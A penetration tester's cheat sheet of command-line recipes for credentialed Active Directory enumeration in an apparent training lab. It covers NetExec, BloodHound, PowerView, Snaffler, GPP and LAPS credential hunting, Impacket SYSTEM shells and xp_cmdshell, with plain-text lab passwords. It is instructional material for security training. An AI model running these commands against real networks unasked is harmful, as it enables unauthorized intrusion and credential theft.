# Credentialed AD Enumeration

## From Linux

### NetExec

Why `-t 1` for most commands?

* Often times in domains we are operating through some sort of tunnel / pivot like Ligolo/Chisel etc. `nxc` uses 256 threads by default which is a bit aggressive, can cause tunnel issues, is alot of network traffic. In most labs its probably ok.

```bash
# Domain user enumeration (with badpwdcount)
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -t 1 --users

# Domain group enumeration
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -t 1 --groups

# Get members of a specific group
netexec ldap <ip> -u <user> -p <pass> -t 1 --groups "Domain Admins"

# Logged on users
nxc smb 172.16.5.130 -u forend -p Klmcargo2 -t 1 --loggedon-users

# Share enumeration
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -t 1 --shares

# Spider shares for files
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -t 5 -M spider_plus --share 'Department Shares'

# Search share content for keywords
netexec smb <ip> -u <user> -p <pass> -t 5 --spider <share> --content --pattern "passw"

# Download file from share
netexec smb <ip> -u <user> -p <pass> -t 1 --share <share> --get-file '\path\to\file' /tmp/localfile

# Cat file via exec (requires admin)
netexec smb <ip> -u <user> -H "<hash>" -t 1 --share C$ -X "type C:\path\to\file.txt"
```

* Results for spider\_plus written to `~/home/<user>/.nxc`

### NetExec LDAP Modules

```bash
# List module options
netexec ldap <ip> -u <user> -p <pass> -t 1 -M <module> --options

# Run module with options
netexec ldap <ip> -u <user> -p <pass> -t 1 -M <module> -o KEY="value"

# Group membership of specific user
netexec ldap <ip> -u <user> -p <pass> -t 1 -M groupmembership -o USER="targetuser"

# Find obsolete operating systems
netexec ldap <ip> -u <user> -p <pass> -t 1 -M obsolete

# Full user list (better than ldapsearch for large domains)
netexec ldap <dc_ip> -u <user> -p <pass> -d <domain> -t 1 --users

# GPP autologin creds
netexec smb <ip> -u <user> -p <pass> -t 1 -M gpp_autologin

# SYSVOL password hunting (Can miss things) double check with snaffler
netexec smb <dc-ip> -d <domain> -u <user> -p <pass> -t 1 -M gpp_password

# machine account quota (RBCD)
nxc ldap "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M maq
```

### ldapsearch

```bash
# Default ldapsearch is limited to 1000 results!
# Use -E pr=1000/noprompt for pagination
ldapsearch -H ldap://<dc_ip> -x -D "domain\\user" -w 'password' \
  -b "DC=domain,DC=local" -s sub "(objectClass=user)" sAMAccountName \
  -E pr=1000/noprompt | awk '/^sAMAccountName:/ {print $2}' > users.txt
```

### SMBMap

```bash
# Check share access
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

# Recursive directory listing
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Tool Share' --dir-only
```

### rpcclient

```bash
# Unauthenticated (NULL session)
rpcclient -U '%' -N 172.16.5.5

# Authenticated
rpcclient -U "forend%Klmcargo2" 172.16.5.5

# Useful commands inside rpcclient
enumdomusers
queryuser 0x457
querydominfo
getdompwinfo
```

### Impacket

#### psexec.py (SYSTEM shell via SMB)

```bash
impacket-psexec inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

* Creates remote service, uploads executable to ADMIN$ share
* Gives SYSTEM shell

#### wmiexec.py (Stealthier, runs as connected user)

```bash
impacket-wmiexec inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

* Semi-interactive shell via WMI
* Less noisy, but each command spawns cmd.exe (event ID 4688)

### Windapsearch

```bash
# Domain Admins
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

# Privileged Users (recursive nested group lookup)
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

### BloodHound.py

```bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

* Upload JSON files to BloodHound GUI
* Start neo4j: `sudo neo4j start`
* Default creds: `neo4j:neo4j`

### BloodHound CE Python

Use `bloodhound-ce-python` for BloodHound Community Edition collections:

```bash
sudo bloodhound-ce-python -u user@domain.local -p 'PASSWORD' -ns DC_IP --dns-tcp --zip -d domain.local -c All
```

Expected output includes domain, computer, user, group, GPO, OU, and container collection before compressing a zip for upload:

```
INFO: Found AD domain: domain.local
INFO: Found 1 computers
INFO: Found 18 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Compressing output into YYYYMMDDHHMMSS_bloodhound.zip
```

Use BloodHound to check for edges such as `ReadLAPSPassword` from the compromised user to a computer.

## From Windows

### PowerView

* Use the maintained fork from BC-SECURITY: https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module\_source/situational\_awareness/network/powerview.ps1

```powershell
Import-Module .\PowerView.ps1

# User info
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Recursive group membership
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Trust mapping
Get-DomainTrustMapping

# Test local admin access
Test-AdminAccess -ComputerName ACADEMY-EA-MS01

# Find users with SPNs (kerberoastable)
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

# Find interesting ACLs
Find-InterestingDomainAcl

# Find local admin access across domain
Find-LocalAdminAccess

# Find where specific users are logged in
Find-DomainUserLocation

# Find interesting domain share files
Find-InterestingDomainShareFile

# Accounts not requiring a password
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

# Users with descriptions (may contain passwords)
Get-DomainUser * | Select samaccountname,description | ?{$_.Description -ne $null}
```

### SharpView (.NET port of PowerView)

```powershell
.\SharpView.exe Get-DomainUser -Identity forend
```

### Snaffler (Credential/Sensitive File Hunter)

```powershell
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

* Enumerates hosts, shares, readable directories
* Hunts for credentials, keys, config files
* Color-coded output (Red = high value, Green = shares found)

Pay attention to SYSVOL script folders, including binaries and adjacent `.config` files, not just `.ps1`/`.vbs` scripts:

```text
\\DOMAIN\SYSVOL\DOMAIN\scripts\ResetPassword\
  ResetPassword.exe
  ResetPassword.exe.config
```

If a SYSVOL binary looks custom, download it and inspect strings or decompile it. Hardcoded service credentials in helper tools can expose accounts such as `svc_helpdesk`:

```bash
strings ResetPassword.exe
```

### SharpHound (BloodHound Collector)

```powershell
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

### LAPSToolkit

```powershell
Import-Module .\LAPSToolkit.ps1
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers
```

## Privileged Access Enumeration

### RDP Access

```powershell
# powerview
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

### WinRM Access

```powershell
# powerview
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

### Connecting via WinRM

```powershell
# From Windows
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

```bash
# From Linux
evil-winrm -i 10.129.201.234 -u <user> -p '<password>'
```

### SQL Server Access

```powershell
# PowerUpSQL
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

```bash
# Impacket
impacket-mssqlclient INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
enable_xp_cmdshell
xp_cmdshell whoami /priv
```

### BloodHound Cypher Queries for Remote Access

```
# WinRM users with dangerous rights
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

# SQL Admin users  
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```
